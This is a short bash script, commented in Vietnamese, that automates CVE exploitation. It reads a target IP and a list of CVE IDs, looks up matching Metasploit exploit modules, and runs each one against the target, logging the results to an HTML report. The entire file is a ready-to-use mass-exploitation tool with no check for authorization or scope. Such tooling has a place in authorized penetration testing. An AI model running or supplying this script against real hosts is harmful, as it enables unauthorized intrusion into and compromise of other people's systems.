#!/bin/bash

# =========================
# AUTO CVE EXPLOIT SCRIPT
# =========================

TARGET=$1
CVE_FILE=$2
REPORT_DIR="cve_exploit_report"
LOG_FILE="$REPORT_DIR/exploit_log.txt"
HTML_REPORT="$REPORT_DIR/report.html"

# Kiểm tra input
if [ -z "$TARGET" ] || [ -z "$CVE_FILE" ]; then
    echo "Usage: $0 <target_ip> <cve_list.txt>"
    exit 1
fi

if [ ! -f "$CVE_FILE" ]; then
    echo "[!] File $CVE_FILE không tồn tại!"
    exit 1
fi

# Tạo thư mục lưu kết quả
mkdir -p $REPORT_DIR
echo "[*] Bắt đầu khai thác CVE trên $TARGET..." | tee -a $LOG_FILE

# Lặp qua từng CVE trong file
while read CVE; do
    echo -e "\n[+] Đang xử lý CVE: $CVE" | tee -a $LOG_FILE

    # Tìm module Metasploit cho CVE
    MODULES=$(msfconsole -q -x "search $CVE; exit" | grep exploit | awk '{print $2}')

    if [ -n "$MODULES" ]; then
        for MODULE in $MODULES; do
            echo "[*] Tìm thấy module: $MODULE" | tee -a $LOG_FILE
            echo "[*] Thử khai thác..." | tee -a $LOG_FILE

            # Chạy exploit với RHOSTS là target
            msfconsole -q -x "
                use $MODULE;
                set RHOSTS $TARGET;
                set LHOST 0.0.0.0;
                run;
                exit;
            " | tee -a $LOG_FILE
        done
    else
        echo "[!] Không tìm thấy module cho $CVE" | tee -a $LOG_FILE
    fi
done < $CVE_FILE

# Xuất HTML report
echo "<html><body><h1>Auto CVE Exploit Report - $TARGET</h1><pre>" > $HTML_REPORT
cat $LOG_FILE >> $HTML_REPORT
echo "</pre></body></html>" >> $HTML_REPORT

echo "[+] Báo cáo đã lưu tại: $HTML_REPORT"
